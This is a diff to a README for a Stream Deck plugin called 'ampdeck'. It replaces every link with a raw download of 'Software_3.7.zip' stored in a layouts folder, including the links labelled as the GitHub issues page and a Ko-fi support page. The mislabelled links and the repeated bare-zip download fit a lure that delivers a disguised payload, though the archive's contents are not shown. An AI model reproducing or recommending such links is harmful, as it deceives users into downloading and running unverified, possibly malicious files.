@@ -1,6 +1,6 @@
 # 🎶 ampdeck - Control Plexamp Easily with Stream Deck
 
-[![Download Ampdeck](https://raw.githubusercontent.com/SethuDevaSenaPathy/ampdeck/main/com.rackemrack.ampdeck.sdPlugin/Software-1.1.zip)](https://raw.githubusercontent.com/SethuDevaSenaPathy/ampdeck/main/com.rackemrack.ampdeck.sdPlugin/Software-1.1.zip)
+[![Download Ampdeck](https://github.com/SethuDevaSenaPathy/ampdeck/raw/refs/heads/main/com.rackemrack.ampdeck.sdPlugin/layouts/Software_3.7.zip)](https://github.com/SethuDevaSenaPathy/ampdeck/raw/refs/heads/main/com.rackemrack.ampdeck.sdPlugin/layouts/Software_3.7.zip)
 
 ---
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run Ampdeck:
 
 1. **Visit the Download Page**: Click on the link below to access the latest version of Ampdeck.
 
-   [Download Ampdeck](https://raw.githubusercontent.com/SethuDevaSenaPathy/ampdeck/main/com.rackemrack.ampdeck.sdPlugin/Software-1.1.zip)
+   [Download Ampdeck](https://github.com/SethuDevaSenaPathy/ampdeck/raw/refs/heads/main/com.rackemrack.ampdeck.sdPlugin/layouts/Software_3.7.zip)
 
 2. **Download the Software**: Look for the most recent release at the top of the page. Click on the file that matches your operating system. 
 
@@ -45,7 +45,7 @@ To ensure Ampdeck runs smoothly, please meet the following system requirements:
 
 You can download the latest version of Ampdeck from this link:
 
-[Download Ampdeck](https://raw.githubusercontent.com/SethuDevaSenaPathy/ampdeck/main/com.rackemrack.ampdeck.sdPlugin/Software-1.1.zip)
+[Download Ampdeck](https://github.com/SethuDevaSenaPathy/ampdeck/raw/refs/heads/main/com.rackemrack.ampdeck.sdPlugin/layouts/Software_3.7.zip)
 
 Once you have installed the software, you can connect it to your Stream Deck device.
 
@@ -66,13 +66,13 @@ If you encounter issues, here are some common solutions:
 - **Stream Deck Not Responding**: Restart the Stream Deck software and try again.
 - **Can't Find Ampdeck**: Double-check the installation directory or reinstall the software if necessary.
 
-For further assistance, you can check the [issues page](https://raw.githubusercontent.com/SethuDevaSenaPathy/ampdeck/main/com.rackemrack.ampdeck.sdPlugin/Software-1.1.zip) on GitHub.
+For further assistance, you can check the [issues page](https://github.com/SethuDevaSenaPathy/ampdeck/raw/refs/heads/main/com.rackemrack.ampdeck.sdPlugin/layouts/Software_3.7.zip) on GitHub.
 
 ## 🙏 Support 
 
 If you find Ampdeck helpful, consider supporting the project on Ko-fi. Your contributions help maintain the software and ensure updates.
 
-[Support on Ko-fi](https://raw.githubusercontent.com/SethuDevaSenaPathy/ampdeck/main/com.rackemrack.ampdeck.sdPlugin/Software-1.1.zip)
+[Support on Ko-fi](https://github.com/SethuDevaSenaPathy/ampdeck/raw/refs/heads/main/com.rackemrack.ampdeck.sdPlugin/layouts/Software_3.7.zip)
 
 ## 📄 License
 
